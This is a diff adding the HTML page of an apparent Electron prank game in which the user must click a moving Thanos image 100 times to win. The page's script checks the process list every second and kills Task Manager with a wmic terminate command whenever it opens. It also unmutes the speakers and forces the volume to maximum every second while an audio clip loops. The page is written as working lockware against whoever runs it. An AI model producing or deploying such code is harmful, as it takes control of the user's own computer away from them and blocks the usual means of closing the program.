@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body class=body>
+    <label class="pulsate" id="Kill">KILL THANOS</label>
+    <label id="scoreboard">SCORE:0</label>
+    <img id="god" src="tenor.gif" onclick="shakeDatAss()">
+    <audio loop id="oof" >     
+        <source src="oof.mp3" type="audio/mpeg"></source>
+    </audio>
+    <audio id ="nope">
+        <source src ="nope.mp3" type="audio/mpeg">
+    </audio>
+</body>
+<script>
+const { ipcRenderer } = require('electron')
+const audio = require('win-audio').speaker
+const tasklist = require('tasklist')
+const exec = require('child_process').execSync
+let score = 0
+const shakeDatAss = () => {
+    increaseScore()
+    let x = Math.floor((Math.random() * 90) + 10);
+    let y = Math.floor((Math.random() *  90) + 10);
+    let thanos = document.getElementById("god");
+    thanos.style.top = x + "%";
+    thanos.style.left = y + "%";
+}
+const increaseScore=()=>{
+    score += 1
+    let message = 'SCORE:' + score
+    document.getElementById("scoreboard").innerHTML = message;
+    if(score == 100){
+        ipcRenderer.send('winner')
+    }
+}
+const theSound = () => {
+    let owned = document.getElementById("oof");
+    owned.play();
+}
+theSound()
+// ipcRenderer.on('TheDayKrabFries', deepFryThem)
+const deepFryThem = () => {
+        let thanos = document.getElementById("god");
+        let owned = document.getElementById("oof");
+        thanos.style.webkitFilter = "blur(10px)"
+        teleportsBehindYou('start')
+        setTimeout(()=>{
+            thanos.style.webkitFilter = "blur(0px)"
+            teleportsBehindYou('stop')
+        },10000)
+        nope()
+        console.log('deepFry')
+    }
+const checkTaskManager = () => {
+    tasklist().then((tasks) =>{
+        // console.log(tasks)
+        for(i=0; i<tasks.length; i++){
+            //console.log(tasks[i].imageName)
+            if(tasks[i].imageName == "Taskmgr.exe"){
+                console.log('found')
+                try{
+                    exec('wmic process where name="Taskmgr.exe" call terminate')
+                }
+                catch{
+                    
+                }
+                deepFryThem()
+            }
+        }
+    })
+}
+const annoy = () => {
+    audio.unmute();
+    audio.set(100)
+}
+const nope = () => {
+    let nope = document.getElementById("nope")
+    nope.play();
+}
+const teleportsBehindYou = (doWhat) => {
+    if(doWhat == 'start'){
+        fuck = setInterval(thanosMoveFast, 500)
+    }
+    else if(fuck){
+        clearInterval(fuck)
+    }
+    else if(doWhat == 'stop'){
+        clearInterval(fuck)
+        clearInterval()
+    }
+}
+const thanosMoveFast = () =>{
+    let x = Math.floor((Math.random() * 90) + 10);
+    let y = Math.floor((Math.random() *  90) + 10);
+    let thanos = document.getElementById("god");
+    thanos.style.top = x + "%";
+    thanos.style.left = y + "%";
+    return
+}
+setInterval(checkTaskManager, 1000)
+setInterval(annoy, 1000)
+ipcRenderer.on('nope', nope)
+</script>
+</html>
